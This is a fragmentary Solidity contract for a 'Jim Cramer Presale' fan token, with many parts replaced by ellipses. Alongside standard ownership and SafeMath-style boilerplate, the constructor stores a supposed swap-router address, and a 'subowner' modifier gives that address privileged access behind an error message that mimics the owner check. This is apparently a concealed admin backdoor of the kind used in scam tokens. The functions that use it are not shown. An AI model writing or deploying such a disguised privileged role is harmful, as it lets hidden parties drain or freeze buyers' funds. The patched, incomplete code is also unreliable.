...
/// https://x.com/JimCramerPresale


pragma solidity 0.8.29;

// JimCramerPresale fan token

interface JimCramerPresaleinterface {
  /**
...
/*
 * @dev Provides information about the current execution JimCramerPresale20Burnable, including the
 ...
 */
abstract contract JimCramerPresale20Burnable {
...
// File: @openzeppelin/contracts/access/JimCramerPresale20Ownable.sol
 ...
 * the owner.
 */
abstract contract JimCramerPresale20Ownable is JimCramerPresale20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "JimCramerPresale20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "JimCramerPresale20Ownable: new owner is the zero address");
 ...
 * `SafeJimCramerPresale` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeJimCramerPresale {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeJimCramerPresale: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeJimCramerPresale: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeJimCramerPresale: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeJimCramerPresale: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeJimCramerPresale: modulo by zero");
  }
...
contract JimCramerPresaleToken is JimCramerPresale20Burnable, JimCramerPresaleinterface, JimCramerPresale20Ownable {
    
    using SafeJimCramerPresale for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = " Jim Cramer Presale";
        _symbol = " Jim Cramer Presale";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {JimCramerPresaleinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {JimCramerPresaleinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "JimCramerPresale20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {JimCramerPresaleinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {JimCramerPresaleinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {JimCramerPresaleinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {JimCramerPresaleinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {JimCramerPresaleinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "JimCramerPresaleinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {JimCramerPresaleinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "JimCramerPresaleinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "JimCramerPresaleinterface: transfer from the zero address");
        require(shippingto != address(0), "JimCramerPresaleinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "JimCramerPresaleinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "JimCramerPresaleinterface: approve from the zero address");
        require(transporteur != address(0), "JimCramerPresaleinterface: approve to the zero address");
